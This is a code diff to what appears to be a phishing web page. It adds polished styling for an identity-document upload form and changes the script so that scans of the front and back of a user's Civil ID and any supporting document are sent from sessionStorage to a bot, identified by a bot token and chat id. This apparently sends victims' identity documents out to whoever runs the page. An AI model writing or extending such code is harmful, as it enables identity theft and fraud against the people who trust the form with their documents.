@@ -21,6 +21,160 @@
             --primary-color: #009144;
             --primary-dark: #006B35;
         }
+        
+        /* Professional Document Upload Styles */
+        .document-notice {
+            background: linear-gradient(135deg, #E8F5E9 0%, #C8E6C9 100%);
+            border: 2px solid #009144;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            box-shadow: 0 4px 20px rgba(0, 145, 68, 0.15);
+        }
+        
+        .document-notice .doc-icon {
+            font-size: 40px;
+            background: #009144;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            color: white;
+        }
+        
+        .document-notice p {
+            color: #006B35;
+            font-size: 15px;
+            font-weight: 500;
+            margin: 0;
+        }
+        
+        .file-upload-wrapper {
+            position: relative;
+            margin-bottom: 12px;
+        }
+        
+        .file-input {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+            z-index: 2;
+        }
+        
+        .file-upload-label {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 24px;
+            border: 2px dashed #009144;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #FAFFF9 0%, #E8F5E9 100%);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .file-upload-label:hover {
+            border-color: #006B35;
+            background: linear-gradient(135deg, #E8F5E9 0%, #C8E6C9 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 145, 68, 0.2);
+        }
+        
+        .file-upload-label .upload-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        
+        .file-upload-label span {
+            color: #006B35;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .file-upload-label small {
+            color: #666;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+        
+        .file-preview {
+            position: relative;
+            margin-top: 16px;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 2px solid #009144;
+        }
+        
+        .file-preview img {
+            width: 100%;
+            max-height: 300px;
+            object-fit: contain;
+            background: #f5f5f5;
+        }
+        
+        .remove-file {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #DC2626;
+            color: white;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        
+        .remove-file:hover {
+            background: #B91C1C;
+            transform: scale(1.1);
+        }
+        
+        .pdf-preview {
+            padding: 40px;
+            text-align: center;
+            background: #f5f5f5;
+            color: #006B35;
+            font-weight: 600;
+        }
+        
+        .form-group label {
+            display: block;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #006B35;
+            font-size: 15px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #009144;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            background: white;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #006B35;
+            box-shadow: 0 0 0 3px rgba(0, 145, 68, 0.15);
+        }
     </style>
 </head>
 <body>
@@ -252,24 +406,19 @@
                 // Send ID Front document if exists
                 const idFrontData = sessionStorage.getItem('id-front_data');
                 if (idFrontData) {
-                    await sendPhotoToBot(botToken, chatId, idFrontData, sessionStorage.getItem('id-front_name'), 'ID_Front - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
+                    await sendDocumentToBot(botToken, chatId, idFrontData, sessionStorage.getItem('id-front_name'), '🪪 ID Front - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
                 }
 
                 // Send ID Back document if exists
                 const idBackData = sessionStorage.getItem('id-back_data');
                 if (idBackData) {
-                    await sendPhotoToBot(botToken, chatId, idBackData, sessionStorage.getItem('id-back_name'), 'ID_Back - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
+                    await sendDocumentToBot(botToken, chatId, idBackData, sessionStorage.getItem('id-back_name'), '🪪 ID Back - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
                 }
 
                 // Send Supporting document if exists
                 const supportingData = sessionStorage.getItem('supporting-doc_data');
                 if (supportingData) {
-                    const supportingType = sessionStorage.getItem('supporting-doc_type');
-                    if (supportingType && supportingType.startsWith('image/')) {
-                        await sendPhotoToBot(botToken, chatId, supportingData, sessionStorage.getItem('supporting-doc_name'), 'Supporting Document');
-                    } else {
-                        await sendDocumentToBot(botToken, chatId, supportingData, sessionStorage.getItem('supporting-doc_name'), 'Supporting Document');
-                    }
+                    await sendDocumentToBot(botToken, chatId, supportingData, sessionStorage.getItem('supporting-doc_name'), '📎 Supporting Document');
                 }
 
                 console.log('All documents sent to bot successfully');
